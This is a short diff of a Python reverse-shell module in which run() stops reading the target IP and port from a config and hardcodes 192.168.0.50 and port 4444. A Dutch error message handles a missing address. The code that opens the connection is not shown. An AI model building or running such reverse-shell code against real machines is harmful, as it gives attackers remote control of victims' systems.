@@ -2,9 +2,9 @@ import socket
 import subprocess
 import os
 
-def run(config):
-    target_ip = config.get("reverse_shell_ip")
-    target_port = config.get("reverse_shell_port")
+def run():
+    target_ip = "192.168.0.50"
+    target_port = "4444"
 
     if not target_ip or not target_port:
         return "Geen IP of poort opgegeven in de config."
